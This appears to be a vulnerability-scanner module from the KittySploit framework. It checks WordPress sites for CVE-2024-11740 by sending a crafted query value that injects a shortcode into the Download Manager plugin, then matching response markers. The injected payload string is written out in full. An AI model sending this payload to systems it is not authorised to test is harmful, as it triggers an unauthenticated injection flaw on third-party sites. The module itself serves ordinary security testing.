#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The The Download Manager plugin for WordPress is vulnerable to arbitrary shortcode execution in all versions u."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Download Manager < 3.3.04 - Unauthenticated Arbitrary Shortcode Execution Detection',
        'description': 'The The Download Manager plugin for WordPress is vulnerable to arbitrary shortcode execution in all versions up to, and including, 3.3.03. This is due to the software allowing users to execute an action that does not properly validate a value before running do_shortcode. This makes it possible for unauthenticated attackers to execute arbitrary shortcodes.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'wordpress', 'wp-plugin', 'download-manager', 'short-code', 'wp', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/advisories/GHSA-cq39-wq4r-hjrj',
            'https://plugins.trac.wordpress.org/browser/download-manager/tags/3.3.02/src/Package/Hooks.php#L42',
            'https://plugins.trac.wordpress.org/browser/download-manager/tags/3.3.02/src/Package/views/shortcode-iframe.php#L203',
            'https://www.wordfence.com/threat-intel/vulnerabilities/id/4a7be578-5883-4cd3-963d-bf81c3af2003?source=cve',
        ],
        'cve': 'CVE-2024-11740',
    }

    def run(self):
        path = '/?__wpdmxp=%27][/wpdm_package][wpdm_all_packages][wpdm_package%20id=%27'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('No Packages Found',)
        body_all = ('"wpdm-all-packages"', 'wpdm-download-link download-on-click',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(severity='high', reason='Download Manager < 3.3.04 - Unauthenticated Arbitrary Shortcode Execution detected', path=path)
            return True
        return False

